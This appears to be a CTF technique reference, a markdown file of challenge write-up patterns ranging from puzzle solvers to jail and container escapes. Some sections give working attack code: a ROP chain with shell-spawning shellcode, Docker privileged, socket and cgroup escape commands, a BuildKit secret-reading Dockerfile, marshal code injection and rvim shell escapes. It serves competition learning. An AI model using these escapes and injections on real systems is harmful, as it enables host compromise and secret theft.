**Pattern (The Architect's Gambit):** Server presents a multi-phase challenge combining cryptography, game theory, and commitment-reveal protocols.

**Phase structure:**
1. **Phase 1 (AES-ECB decryption):** Decrypt pile values with provided key. Determine winner from game state.
2. **Phase 2 (AES-CBC with derived keys):** Keys derived via SHA-256 chain from Phase 1 results. Decrypt to get game parameters.
3. **Phase 3 (Interactive gameplay):** Play optimal moves in a combinatorial game, bound by commitment-reveal protocol.

**Commitment-reveal (HMAC binding):**
```python
import hmac, hashlib

def compute_binding_token(session_nonce, answer):
    """Server verifies your answer commitment before revealing result."""
    message = f"answer:{answer}".encode()
    return hmac.new(session_nonce, message, hashlib.sha256).hexdigest()

# Flow: send token first, then server reveals state, then send answer
# Server checks: HMAC(nonce, answer) == your_token
# Prevents changing your answer after seeing the state
```

**GF(2^8) arithmetic for game drain calculations:**
```python
# Galois Field GF(256) used in some game mechanics (Nim variants)
# Nim-value XOR determines winning/losing positions

def gf256_mul(a, b, poly=0x11b):
    """Multiply in GF(2^8) with irreducible polynomial."""
    result = 0
    while b:
        if b & 1:
            result ^= a
        a <<= 1
        if a & 0x100:
            a ^= poly
        b >>= 1
    return result

# Nim game with GF(256) move rules:
# Position is losing if Nim-value (XOR of pile Grundy values) is 0
# Optimal move: find pile where removing stones makes XOR sum = 0
```

**Game tree memoization (C++ for performance):**
```python
# Python too slow for large state spaces — use C++ with memoization
# State compression: encode all pile sizes into single integer
# Cache: unordered_map<state_t, bool> for win/loss determination

# Python fallback for small games:
from functools import lru_cache

@lru_cache(maxsize=None)
def is_winning(state):
    """Returns True if current player can force a win."""
    state = tuple(sorted(state))  # Normalize for caching
    for move in generate_moves(state):
        next_state = apply_move(state, move)
        if not is_winning(next_state):
            return True  # Found a move that puts opponent in losing position
    return False  # All moves lead to opponent winning
```

**Key insights:**
- Multi-phase challenges require solving each phase sequentially — each phase's output feeds the next
- HMAC commitment-reveal prevents guessing; you must compute the correct answer
- GF(256) Nim variants require Sprague-Grundy theory, not brute force
- When Python recursion is too slow (>10s), rewrite game solver in C++ with state compression and memoization

---

## Emulator ROM-Switching State Preservation (BSidesSF 2026)

**Pattern (wromwarp):** In emulator debuggers, the `/load` command may replace only the ROM program while preserving CPU state (registers, RAM, program counter). By switching between ROMs at specific PC values, you can execute arbitrary instruction sequences using instructions from different programs.

**Key insight:** When a new ROM is loaded via the emulator's debug interface, the CPU state (registers, RAM, PC) remains unchanged. Only the program memory (ROM) is replaced. This means:
- If ROM A has loaded secret data into RAM at certain addresses
- And ROM B has a `display` instruction at the same PC where ROM A's execution paused
- Loading ROM B at that point causes the CPU to execute ROM B's instruction (display) using ROM A's data (the secret)

**Exploit workflow:**
```text
1. Load ROM_A (contains INIT that loads secret into RAM)
2. Step through ROM_A until secret data is in RAM
3. Note the current PC value
4. /load ROM_B (PC, registers, RAM all preserved)
5. ROM_B has a "display memory" instruction at the current PC
6. Step → executes ROM_B's display instruction, showing ROM_A's secret data
```

**Practical example:**
```python
from pwn import *

p = remote('target', port)

# Load first ROM that initializes secret data
p.sendlineafter('> ', '/load rom_init.bin')
# Step until secret is in memory (determined by analysis)
for _ in range(42):
    p.sendlineafter('> ', '/step')

# Switch to ROM that displays memory at current PC
p.sendlineafter('> ', '/load rom_display.bin')
p.sendlineafter('> ', '/step')

# Read the leaked secret
flag = p.recvline().strip()
print(f"Flag: {flag}")
```

**When to recognize:**
- Emulator/debugger challenge with `/load`, `/step`, `/run`, `/dump` commands
- Multiple ROM files provided
- One ROM initializes protected memory, another has display/output capabilities
- Challenge mentions "ROM switching", "hot swap", or "state preservation"

**Key lessons:**
- Emulator debug interfaces that don't reset CPU state on ROM load create a state-mixing vulnerability
- Combine instructions from different programs by loading them at the right PC values
- Protected memory (read-only in one ROM's context) becomes accessible via another ROM's display instructions

**References:** BSidesSF 2026 "wromwarp"

---

## Python Marshal Code Injection (iCTF 2013)

**Pattern:** Server deserializes base64-encoded `marshal` data and executes it as a Python function. Inject arbitrary code via serialized function code objects.

```python
import marshal, types, base64

# Craft payload function that exfiltrates data over the socket
payload = lambda sock: sock.send(globals()['flag'].encode())

# Serialize the function's code object
serialized = base64.b64encode(marshal.dumps(payload.__code__)).decode()

# Server-side execution pattern:
# func = types.FunctionType(marshal.loads(base64.b64decode(data)), globals())
# func(client_socket)
```

**Key insight:** `marshal.loads()` is as dangerous as `pickle.loads()` — it deserializes arbitrary Python code objects. Unlike pickle, marshal is rarely sandboxed. The injected function runs with access to the server's `globals()`, enabling flag exfiltration via the socket connection.

---

## Benford's Law Frequency Distribution Bypass (iCTF 2013)

**Pattern:** Server validates that input digit frequency matches Benford's Law distribution (+-5% tolerance). Craft input with correct digit distribution to pass the check.

```python
import random

# Benford's Law: P(d) = log10(1 + 1/d) for leading digit d (1-9)
benford = {d: round(100 * (1 + 1/d) / sum(1/i for i in range(1,10))) for d in range(1,10)}
# Approx: 1→30%, 2→18%, 3→12%, 4→10%, 5→8%, 6→7%, 7→6%, 8→5%, 9→5%

def generate_benford_compliant(length=1000):
    digits = []
    for d, pct in benford.items():
        digits.extend([str(d)] * int(length * pct / 100))
    random.shuffle(digits)
    return ''.join(digits[:length])
```

**Key insight:** Benford's Law describes the frequency of leading digits in naturally occurring datasets. If a service validates digit distribution, generate compliant input rather than random numbers. Tolerance is typically +-5%, so approximate percentages work.

---

## Parallel Connection Oracle Relay (Hack.lu 2015)

When a server generates deterministic sequences and provides feedback, exploit multiple simultaneous connections to share answers:

1. Open N+1 connections with identical timing (same PRNG seed)
2. Sacrifice one connection per round to discover the correct answer
3. Relay discovered answer to remaining connections via synchronization

```python
import threading

NUM_CONNECTIONS = 101
barriers = [threading.Barrier(NUM_CONNECTIONS - i) for i in range(100)]
correct_answers = [None] * 100

def worker(index, sock):
    for round_num in range(100):
        barriers[round_num].wait()  # Synchronize all threads

        if index == round_num:
            # This thread sacrifices itself to probe
            for guess in range(100):
                sock.send(str(guess).encode())
                response = sock.recv(1024)
                if b'correct' in response:
                    correct_answers[round_num] = guess
                    break
        else:
            # Wait for oracle thread to find answer
            barriers[round_num].wait()
            sock.send(str(correct_answers[round_num]).encode())

threads = [threading.Thread(target=worker, args=(i, connections[i])) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
```

**Key insight:** Works against any service where multiple connections share state (same PRNG seed from identical connection times). The sacrifice pattern ensures at least one connection survives all rounds.

---

## Nonogram Solver to QR Code Pipeline (SECCON 2015)

Automate solving nonogram puzzles that produce QR codes:

1. **Parse constraints** from web interface (BeautifulSoup for HTML tables)
2. **Solve nonogram** using external solver or constraint propagation
3. **Render to image** and decode QR

```python
from PIL import Image
import subprocess, qrtools

# Parse row/column constraints from HTML
rows = parse_constraints(html, 'rows')   # [[3,1], [2,2], ...]
cols = parse_constraints(html, 'cols')

# Feed to nonogram solver (e.g., nonogram-0.9)
solver_input = format_for_solver(rows, cols)
result = subprocess.run(['./nonogram'], input=solver_input, capture_output=True)

# Convert text grid to QR image
grid = parse_solver_output(result.stdout)
cell_size = 10
img = Image.new('RGB', (len(grid[0]) * cell_size, len(grid) * cell_size), 'white')
# Draw black cells where grid == '#'

# Decode QR
qr = qrtools.QR()
qr.decode('qrcode.png')
answer = qr.data
```

**Key insight:** Nonogram solvers are available as command-line tools. The key challenge is parsing the web interface and converting output to a valid QR image. Add quiet zones (white border) around the QR for reliable decoding.

---

## 100 Prisoners Problem / Cycle-Following Strategy (Sharif CTF 2016)

The classic 100 prisoners problem appears in CTF challenges as an "impossible" probability game:

- N prisoners each open N/2 boxes looking for their number
- All must succeed for the group to win
- Optimal strategy: follow permutation cycles (success rate ~31%)

```python
def solve_prisoners(boxes):
    """Follow cycle starting from own number"""
    N = len(boxes)
    results = []
    for prisoner in range(N):
        current = prisoner
        found = False
        for _ in range(N // 2):
            if boxes[current] == prisoner:
                found = True
                break
            current = boxes[current]  # Follow the cycle
        results.append(found)
    return all(results)
```

**Key insight:** Random strategy succeeds with probability (1/2)^N ≈ 0. Cycle-following succeeds with probability 1 - ln(2) ≈ 0.3069 for large N. The game fails only if any cycle exceeds length N/2. Pre-check cycle lengths if the box arrangement is known.

---

## C Code Jail Escape via Emoji Identifiers and Gadget Embedding (Midnight Flag 2026)

Escape a C code jail that bans all alphanumeric characters, whitespace, and most operators by using GCC's Unicode identifier support and embedding machine code gadgets inside arithmetic constants.

**Constraints:** Only `(){}[];,=.+*%@#~` and emoji allowed. No letters, digits, whitespace, quotes, or `?&!|$<>^:/-`.

### Step 1: Integer construction from emoji

GCC allows emoji as identifiers. `(😃==😃)` is compile-time constant `1`. Build any integer via addition and multiplication:

```c
// Building 15: 3 * (2*2 + 1)
((😃==😃)+(😃==😃)+(😃==😃))*(((😃==😃)+(😃==😃))*((😃==😃)+(😃==😃))+(😃==😃))
```

### Step 2: Embed gadgets via add eax constant encoding

At `-O0`, `var = var + CONSTANT` compiles to `05 XX XX XX XX` (add eax, imm32). Jump to offset+1 to execute the constant bytes as instructions:

| Target bytes | Instruction | Constant (decimal) |
|---|---|---|
| `0f 05 c3` | syscall; ret | 12780815 |
| `58 c3` | pop rax; ret | 50008 |
| `5f c3` | pop rdi; ret | 50015 |
| `5a c3` | pop rdx; ret | 50010 |
| `5e c3` | pop rsi; ret | 50014 |
| `54 5e 0f 05` | push rsp; pop rsi; syscall | 84893268 |

```c
// Each gadget function embeds one instruction sequence:
😇(){😼=😼+<12780815_as_emoji_expr>;}  // syscall; ret at 😇+15
```

### Step 3: Stack-based ROP via push rsp; pop rsi; syscall

Call the `push rsp; pop rsi; syscall` gadget with `sys_read` args to write a ROP chain directly to the stack return address:

```c
// (gadget_func + 15)(stdin=0, buf=ignored_rsp_used, len=4096)
😀(){(😃+<15_expr>)(😷,😸,<4096_expr>);}
```

The `push rsp` captures the return address location, `pop rsi` sets it as the read buffer, then `syscall` reads attacker input onto the stack.

### Step 4: ROP chain to mprotect + read + shellcode

```python
from pwn import *

rop = flat([
    0xdeadbeef,      # consumed by pop rbp
    POP_RAX, 10,     # sys_mprotect
    POP_RDI, 0x404000,
    POP_RSI, 0x2000,
    POP_RDX, 7,      # PROT_READ|WRITE|EXEC
    SYSCALL_RET,
    POP_RAX, 0,      # sys_read
    POP_RDI, 0,      # stdin
    POP_RSI, 0x404020,
    POP_RDX, 0x200,
    SYSCALL_RET,
    0x404020,         # jump to shellcode
])
```

### Step 5: Shellcode with glob for unknown flag path

```python
# execve("/bin/sh", ["/bin/sh", "-c", "cat /flag*"], NULL)
shellcode = asm(shellcraft.execve("/bin/sh", ["/bin/sh", "-c", "cat /flag*"]))
```

**Key insight:** GCC's `-static -nostartfiles -nostdlib` produces a minimal binary with deterministic addresses (no ASLR). Each emoji function lands at a predictable address (0x401000, 0x40101c, ...). The `add eax, imm32` encoding is the key primitive — any 4-byte gadget sequence can be embedded as an arithmetic constant in a valid C expression.

**Compilation flags to watch for:** `-nostartfiles -nostdlib -static` indicates no libc, no CRT, deterministic layout — ideal for address-hardcoded exploits.

---

## BuildKit Daemon Exploitation for Build Secrets (BSidesSF 2026)

**Pattern (builds-as-a-service):** Challenge accepts a Dockerfile and builds it. The build environment uses Docker BuildKit with `--mount=type=secret,id=flag` to inject secrets during build. An exposed BuildKit daemon (tcp://127.0.0.1:1234) allows submitting nested build requests that mount and read the secret.

**Attack (two-stage Dockerfile):**

Stage 1 — Submit a Dockerfile that installs `buildctl` and triggers a nested build:
```dockerfile
FROM moby/buildkit:v0.17.1-rootless
COPY Dockerfile.exploit /tmp/Dockerfile
RUN <<'EOF'
buildctl --addr tcp://127.0.0.1:1234 build \
  --frontend dockerfile.v0 \
  --local context=/tmp --local dockerfile=/tmp \
  --opt filename=Dockerfile.exploit \
  --progress plain 2>&1; false
EOF
```

Stage 2 — The nested Dockerfile (`Dockerfile.exploit`) mounts and reads the secret:
```dockerfile
FROM alpine
RUN --mount=type=secret,id=flag cat /run/secrets/flag; false
```

**Why `; false`:** Forces a non-zero exit code which causes BuildKit to dump the full build output (including the flag) to stderr. Without it, successful builds may suppress intermediate output.

**Key insight:** BuildKit's gRPC API on localhost is unauthenticated by default. Any container running in the same network namespace can submit build requests. The `--mount=type=secret` mechanism is designed for build-time secrets but relies on the daemon being inaccessible — if the daemon is exposed, any build can request any secret.

**Alternative approach:** If `buildctl` is unavailable, use the BuildKit gRPC API directly:
```python
# buildctl du / buildctl debug workers  — enumerate available workers
# buildctl build --progress=plain — trace build output
```

**When to recognize:** Challenge provides a Dockerfile upload/build service. Look for BuildKit features (`--mount=type=secret`, `BUILDKIT_INLINE_CACHE`, `# syntax=` directives). Check if the build daemon is accessible from within built containers.

**Real-world relevance:** This mirrors actual CI/CD supply chain attacks where build systems expose secrets to untrusted build steps. GitHub Actions, GitLab CI, and Jenkins all have similar secret injection mechanisms.

**References:** BSidesSF 2026 "builds-as-a-service"

---

## Docker Container Escape Techniques

### Privileged Container Breakout

Containers started with `--privileged` have all Linux capabilities and access to host devices. Mount the host filesystem and chroot:

```bash
# List host disks
fdisk -l
# Mount host root filesystem
mkdir /mnt/host && mount /dev/sda1 /mnt/host
# Chroot to host
chroot /mnt/host /bin/bash
# Or via nsenter (requires PID 1 on host)
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### Docker Socket Escape

If `/var/run/docker.sock` is mounted inside the container, create a new privileged container that mounts the host root:

```bash
# Check for socket
ls -la /var/run/docker.sock
# Escape: create privileged container with host root mounted
docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host /bin/bash
# Or via API if docker CLI unavailable:
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
```

### Capability-Based Escape (CAP_SYS_ADMIN)

With `CAP_SYS_ADMIN`, exploit cgroup release_agent for host command execution:

```bash
# Create cgroup, set release_agent to host command
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo 'cat /flag > /tmp/cgrp/x/flag' >> /cmd && chmod +x /cmd
echo $$ > /tmp/cgrp/x/cgroup.procs  # Trigger release_agent
```

### Container Information Leakage

Even without escape, containers leak host info:
- `/proc/self/cgroup` -- container ID
- `/proc/mounts` -- overlayfs `upperdir` reveals host path
- `/sys/kernel/slab/*/cgroup/` -- other container IDs (cgroup debug info)
- `/proc/1/environ` -- environment variables from container start

**Key insight:** Check `--privileged` flag, mounted sockets (`docker.sock`), and capabilities (`capsh --print`) first. Privileged = instant escape. Socket = create new privileged container. CAP_SYS_ADMIN = cgroup release_agent. Without any of these, focus on information leakage and application-level escapes.

---

## 15-Puzzle Solvability as Bit Encoder (SharifCTF 8)

128 15-puzzles encode 128 bits of a flag. Each bit is 1 if the puzzle is solvable, 0 if not:

```python
def is_solvable(grid):
    # Count inversions (pairs where a > b and a appears before b)
    flat = [x for row in grid for x in row if x != 0]
    inversions = sum(1 for i in range(len(flat))
                     for j in range(i+1, len(flat)) if flat[i] > flat[j])
    # For 4x4: solvable iff inversions + blank_row_from_bottom is even
    blank_row = next(i for i, row in enumerate(grid) if 0 in row)
    blank_from_bottom = len(grid) - 1 - blank_row
    return (inversions + blank_from_bottom) % 2 == 0

flag_bits = ''.join('1' if is_solvable(puzzle) else '0' for puzzle in puzzles)
flag = bytes(int(flag_bits[i:i+8], 2) for i in range(0, len(flag_bits), 8))
```

**Key insight:** The 15-puzzle has an invariant: exactly half of all permutations are solvable. A puzzle's solvability depends on the parity of inversions plus the blank tile's row from the bottom. This provides a natural 1-bit encoding per puzzle. When a challenge provides many puzzle instances with no obvious goal, check if solvability encodes binary data. The number of puzzles matching a multiple of 8 strongly suggests bit encoding.

---

## Taint Analysis Bypass in Custom Language via Type Coercion (PlaidCTF 2018)

**Pattern:** In a custom ML-like language with a secrecy/taint system, the if-expression's secrecy depends on the return type, not the condition. Wrap side-effecting code in a function, coerce it to a private type, and use if-statement to select between dummy and leaking functions based on private flag bits. The purity checker doesn't analyze function internals.

```ml
(* pupper variant: if condition's secrecy doesn't propagate to return *)
let leaked = ref 0 in
let test = fn (bit : int) =>
  if !secret < bit then ()
  else (secret := !secret - bit; leaked := !leaked + bit)
in
test 128; test 64; test 32; test 16; test 8; test 4; test 2; test 1;
!leaked  (* public int that reveals private byte *)

(* doggo variant: function coercion hides side effects *)
let ignore = (fn (bit : int) => () :> private unit) :> private (int -> private unit) in
let incr = (fn (bit : int) => (leaked := !leaked + bit) :> private unit)
           :> private (int -> private unit) in
(if !secret < bit then ignore else incr) bit
(* if returns private function type, but selected function modifies public ref *)
```

**Key insight:** Information flow type systems often check secrecy labels at expression level, not data flow level. If the return type matches but the side effects differ, the type checker is satisfied while private data leaks through public mutable references. Two common bypasses: (1) if-condition secrecy not propagated to branches, (2) function type coercion hiding mutable side effects.

---

## Shredded Document Pixel-Edge Reassembly Under Time Pressure (Nuit du Hack CTF 2018)

**Pattern:** 100 shredded paper strips must be reassembled under 10-second time limit. Detect orientation via token position, compute edge similarity using pixel darkness bitmasks, greedily place strips by minimizing XOR/Hamming distance between adjacent edges, then OCR.

```python
from PIL import Image
import pytesseract

class Strip:
    def __init__(self, img):
        self.img = img
        w, h = img.size
        self.trace_first = 0  # left edge bitmask
        self.trace_last = 0   # right edge bitmask
        for y in range(h):
            # Dark pixel (sum < 765) = bit set at position y
            self.trace_first |= (1 if sum(img.getpixel((0, y))) < 765 else 0) << y
            self.trace_last |= (1 if sum(img.getpixel((w-1, y))) < 765 else 0) << y

def edge_distance(strip_a, strip_b):
    """Hamming distance between right edge of A and left edge of B"""
    return bin(strip_a.trace_last ^ strip_b.trace_first).count('1')

# Greedy placement: for each position, pick the strip with minimum edge distance
```

**Key insight:** Shredded document strips share edge pixels at cut boundaries. Encode each strip's left and right edge as binary bitmasks (dark=1, light=0), then use XOR + popcount (Hamming distance) to find the best-matching adjacent strips. Greedy placement with edge distance metric reassembles the document in milliseconds.

---

## References
- EHAX 2026 "The Architect's Gambit": Multi-phase AES + HMAC + GF(256) Nim
- BSidesSF 2026 "wromwarp": Emulator ROM-switching state preservation
- iCTF 2013: Python marshal code injection, Benford's Law bypass
- Hack.lu 2015: Parallel connection oracle relay
- SECCON 2015: Nonogram solver to QR code pipeline
- Sharif CTF 2016: 100 prisoners problem / cycle-following strategy
- SharifCTF 8: 15-puzzle solvability as bit encoder
- Midnight Flag 2026: C code jail escape via emoji identifiers
- BSidesSF 2026 "builds-as-a-service": BuildKit daemon build secret exploitation
- SunshineCTF 2016: Levenshtein distance oracle attack
- PlaidCTF 2018: Taint analysis bypass via type coercion in custom language
- Nuit du Hack CTF 2018: Shredded document pixel-edge reassembly

---

## Levenshtein Distance Oracle Attack (SunshineCTF 2016)

Oracle responds with edit distance between guess and secret. Attack strategy:

1. **Determine length:** Submit empty string, distance = secret length
2. **Identify present characters:** Submit single repeated character (e.g., "aaaa..."), distance = len - count_of_that_char
3. **Locate positions:** Binary search -- fill half positions with known-present char, half with known-absent, narrow by distance change

```python
# Determine which chars are present
for c in string.printable:
    d = oracle(c * length)
    count = length - d  # Number of times c appears
    if count > 0:
        chars[c] = count
```

**Key insight:** Edit distance as a side channel. Binary search locates character positions from Levenshtein feedback in O(n log n) queries.

---

## SECCOMP Bypass via High-Bit File Descriptor Trick (33C3 CTF 2016)

**Pattern (tea):** SECCOMP filter blocks `close(fd)` for fd values 0, 1, and 2 (stdin/stdout/stderr). Bypass: `close(0x8000000000000002)` passes the 64-bit comparison (not equal to 2) but the kernel truncates the fd argument to 32 bits, actually closing fd 2. This frees fd 2, so the next `open()` returns fd 2. Now `write(2, ...)` writes to the newly opened file instead of stderr, and SECCOMP allows it because fd 2 was never explicitly blocked for write.

```c
// SECCOMP rule: deny close(fd) where fd == 0 || fd == 1 || fd == 2
// Bypass: close with high-bit set
close(0x8000000000000002);  // SECCOMP sees fd != 2 (64-bit compare) -> ALLOW
// Kernel: fd = (int)(0x8000000000000002) = 2 -> closes fd 2

open("/proc/self/mem", O_WRONLY);  // returns fd 2 (lowest available)
// Now write to /proc/self/mem via fd 2 to modify parent process memory
```

**Key insight:** SECCOMP BPF operates on the raw 64-bit syscall argument, but the kernel's `close()` implementation casts to `int` (32-bit). Setting bit 63 changes the 64-bit value while preserving the 32-bit truncated result. This type/width mismatch between SECCOMP filter and kernel syscall handler is a general bypass pattern — check argument widths for any filtered syscall.

---

## rvim Jail Escape via Custom vimrc with Python3 Execution (BKP 2017)

**Pattern (vimjail):** `rvim` (restricted vim) blocks `:!`, `:shell`, and similar command execution. However, `rvim -u custom_vimrc` loads a user-specified vimrc file that executes before restrictions are fully applied. If `rvim` is run via `sudo -u targetuser`, the vimrc can contain `:python3 import os; os.system("cmd")` to execute commands as the target user.

```bash
# Create malicious vimrc
cat > /tmp/evil_vimrc << 'EOF'
:python3 import os; os.system("/home/ctfuser/flagReader /.flag")
:q!
EOF

# Launch rvim with custom vimrc as target user
sudo -u secretuser rvim -u /tmp/evil_vimrc /dev/null

# Alternative: interactive escape once inside rvim
:py3 import os; os.system("/bin/bash")
```

**Key insight:** `rvim` restricts shell commands (`:!cmd`) but Python/Lua/Ruby interfaces remain available. The `:python3` or `:py3` command executes arbitrary Python code, including `os.system()`. If vim was compiled with `+python3`, this bypasses all shell restrictions. Check `:version` for `+python3`, `+lua`, or `+ruby` — any scripting interface escapes the jail.

---

## Restricted vim Escape via CTRL-W F and netrw File Browser (TokyoWesterns 2018)

**Pattern:** A vim jail blocks `:`, `Q`, `g`, and scripting interfaces (`:py`, `:lua`, `:ruby`), but leaves normal-mode navigation commands alive. Press `CTRL-W` followed by `F` (capital) — vim splits a new window and opens the netrw file browser on the path under the cursor. From netrw you navigate like a directory listing and read arbitrary files with zero `:` commands.

```text
# Keystrokes (no ex commands required)
:   — blocked
CTRL-W F    — splits window, opens current path as netrw buffer
j / k       — navigate entries
Enter       — read selected file into a new buffer

# If you need to run a command and `:` is banned, put the cursor on a keyword
# such as `ls` and press K — vim opens the man page, then inside the man page
# you can press `!` and get a shell prompt.
```

**Key insight:** vim's restricted mode only covers `:`-based ex commands; normal-mode file-browser (`netrw`), manual-page lookup (`K`), and help (`<C-w>gF`) interfaces stay wide open. Any binary that enforces "restricted vim" via `:set modifiable`, disabled `:!`, or a blocked command-line is trivially bypassed by one of CTRL-W F, K, or gF. When auditing a vim sandbox, always test these three normal-mode primitives first.

**References:** TokyoWesterns CTF 4th 2018 — vimshell, writeup 11269

---

See [games-and-vms.md](#part-4) for 2018-era additions (XSLT VM, JS edge cases, timing oracles, OEIS, QR reassembly, math recurrences, CAPTCHA solvers, esolang polyglots, bytebeat).


See also: [games-and-vms.md](games-and-vms.md) for WASM patching, Roblox place file reversing, PyInstaller extraction, marshal analysis, Python env RCE, Z3 constraint solving, K8s RBAC bypass, floating-point precision exploitation, and custom assembly language sandbox escape.

See also: [games-and-vms.md](#part-2) for cookie checkpoint brute-forcing, Flask cookie game state leakage, WebSocket game manipulation, server time-only validation bypass, De Bruijn sequences, Brainfuck instrumentation, and WASM memory manipulation.

---

# Part 4

Additional CTF-era challenges extracted from 2018+ writeups. For earlier parts, see [games-and-vms.md](games-and-vms.md), [games-and-vms.md](#part-2), and [games-and-vms.md](#part-3).

## Table of Contents
- [XSLT as Turing-Complete VM for Binary Search (35C3 2018)](#xslt-as-turing-complete-vm-for-binary-search-35c3-2018)
- [JavaScript MAX_SAFE_INTEGER Successor Equality (35C3 2018)](#javascript-max_safe_integer-successor-equality-35c3-2018)
- [Binary Search Oracle in Comparison-Only DSL (35C3 2018)](#binary-search-oracle-in-comparison-only-dsl-35c3-2018)
- [Blind SQLi via Script-Engine Timeout Error (35C3 2018)](#blind-sqli-via-script-engine-timeout-error-35c3-2018)
- [OEIS Sequence Lookup Automation for Recurrence Puzzles (X-MAS CTF 2018)](#oeis-sequence-lookup-automation-for-recurrence-puzzles-x-mas-ctf-2018)
- [QR Code Reassembly from Format-String Structural Constraints (Square CTF 2018)](#qr-code-reassembly-from-format-string-structural-constraints-square-ctf-2018)
- [Matrix Exponentiation for Fibonacci-Like Recurrence (Pwn2Win 2018)](#matrix-exponentiation-for-fibonacci-like-recurrence-pwn2win-2018)
- [Tribonacci Recurrence for Frog Jump Counting (FireShell 2019)](#tribonacci-recurrence-for-frog-jump-counting-fireshell-2019)
- [Selenium + Tesseract for Dynamic Font CAPTCHA (Square CTF 2018)](#selenium--tesseract-for-dynamic-font-captcha-square-ctf-2018)
- [Brainfuck Decodes Piet Image URL — Multi-Layer Polyglot (RITSEC 2018)](#brainfuck-decodes-piet-image-url--multi-layer-polyglot-ritsec-2018)
- [Bytebeat Synth Code Recognition for Hidden Audio (RITSEC 2018)](#bytebeat-synth-code-recognition-for-hidden-audio-ritsec-2018)

---

## XSLT as Turing-Complete VM for Binary Search (35C3 2018)

**Pattern:** Challenge only executes XSLT templates. `<xsl:choose>`, `<xsl:call-template>` with recursion, and `<xsl:variable>` form a full Turing-complete runtime with a stack. Encode a binary-search oracle: `<drinks>` elements hold the stack, `<plate>` elements are instructions, `<course>` blocks act as labels.

```xml
<xsl:template name="step">
  <xsl:param name="lo"/><xsl:param name="hi"/>
  <xsl:variable name="mid" select="($lo + $hi) div 2"/>
  <xsl:choose>
    <xsl:when test="$target = $mid">...found...</xsl:when>
    <xsl:when test="$target &lt; $mid">
      <xsl:call-template name="step">
        <xsl:with-param name="lo" select="$lo"/>
        <xsl:with-param name="hi" select="$mid"/>
      </xsl:call-template>
    </xsl:when>
    ...
  </xsl:choose>
</xsl:template>
```

**Key insight:** Any "pure template" language with named recursion and conditionals is a VM. Build a primitive (binary search, bit extraction, state accumulator) out of its native constructs before trying to escape the sandbox.

**References:** 35C3 CTF 2018 — Juggle, writeup 12803

---

## JavaScript MAX_SAFE_INTEGER Successor Equality (35C3 2018)

**Pattern:** Challenge asserts `x !== x + 1`. For `x = Number.MAX_SAFE_INTEGER + 1 === 9007199254740992`, IEEE 754 rounding makes `x + 1 === x` true, so the assertion passes and the check is bypassed.

```js
let x = 9007199254740992; // 2^53
console.log(x === x + 1); // true
```

**Key insight:** Any numeric invariant that compares `n` to `n + 1` fails at the float boundary. Test with `2^53`, `Infinity`, `NaN`, and `-0 === 0` combinations when a JS check looks like it's making assumptions about arithmetic.

**References:** 35C3 CTF 2018 — Number Error, writeup 12828

---

## Binary Search Oracle in Comparison-Only DSL (35C3 2018)

**Pattern:** Challenge DSL only exposes comparisons against a secret value. Convert it into a full oracle by subtracting decreasing powers of two (`2^30, 2^29, ..., 2^0`) from an initial guess, adding whenever the comparison reports "less than" and subtracting when "greater than".

```python
guess = 0
for shift in range(30, -1, -1):
    guess += 1 << shift
    if oracle(guess) > 0:     # guess too high
        guess -= 1 << shift
```

**Key insight:** Any boolean comparator gives you binary search in `O(log N)` queries. The same trick collapses any comparison-based leak — regex match, timing channel, HTTP status code — into the full value.

**References:** 35C3 CTF 2018 — Juggle, writeup 12803

---

## Blind SQLi via Script-Engine Timeout Error (35C3 2018)

**Pattern:** Server evaluates `eval` of a user-supplied snippet with a tight timeout. Wrap the payload in `if charAt(FLAG, pos) == '?' then pause(10000) end` — correct characters hang until the timeout triggers an error; wrong characters return instantly. Treat the timeout as a truthy bit.

```lua
-- blind timing oracle in Lua eval sandbox
for c in printable do
    send(("if charAt(FLAG, %d) == '%s' then pause(10000) end"):format(i, c))
    if response_time > 5 then flag = flag .. c; break end
end
```

**Key insight:** Script-eval services with timeouts are stateful oracles: any long-running expression leaks a boolean via the wall-clock difference between timeout and instant return.

**References:** 35C3 CTF 2018 — dev/null, writeups 12830, 12871

---

## OEIS Sequence Lookup Automation for Recurrence Puzzles (X-MAS CTF 2018)

**Pattern:** Server asks for the next term in a mathematical sequence. Automate the lookup: query https://oeis.org/search?q=1,1,2,5,14, parse the first result with pyquery, extract the `Next term`, send it back. Wrap around a MD5 captcha brute force for PoW-protected services.

```python
import requests
from pyquery import PyQuery as pq
r = requests.get('https://oeis.org/search', params={'q': ','.join(map(str, seq))})
doc = pq(r.text)
next_term = doc('pre').eq(1).text().split(',')[len(seq)]
```

**Key insight:** Any integer-sequence puzzle is solved in one HTTP request via OEIS. The hard part is the wrapper (captcha, PoW, socket framing) — automate that once and the math stops being the bottleneck.

**References:** X-MAS CTF 2018 — A Weird List of Sequences, writeup 12683

---

## QR Code Reassembly from Format-String Structural Constraints (Square CTF 2018)

**Pattern:** Challenge ships shredded 1-pixel columns of a QR code. Instead of brute-forcing `21!` permutations, anchor on QR invariants: the three finder patterns, the timing pattern between them, the fixed dark module, and the 15-bit format string at column 8 has only 32 valid values (EC level × mask pattern). Filter slices by structural constraints, then permute only the remaining few.

```python
wanted_formats = load_32_valid_qr_formats()
for col in slices:
    if col[:7] in wanted_formats_column_8:
        candidate_cols.append(col)
for perm in itertools.permutations(candidate_cols):
    if decode_qr(np.stack(perm)):
        return perm
```

**Key insight:** Format-specific constraints collapse permutation spaces. QR Version 1 has only 32 possible format strings; anchor on them to prune before brute-forcing.

**References:** Square CTF 2018 — C3: Shredded, writeup 12331

---

## Matrix Exponentiation for Fibonacci-Like Recurrence (Pwn2Win 2018)

**Pattern:** Challenge asks for the `N`-th term of a recurrence `a_{n+1} = f(a_n, a_{n-1})` with `N` up to `10^12`. Naive iteration is impossible. Write the update as a 2×2 matrix product `[a_{n+1}; a_n] = M * [a_n; a_{n-1}]` and compute `M^N` in `O(log N)` with binary exponentiation.

```python
MOD = 10**9 + 7
def matmult(a, b):
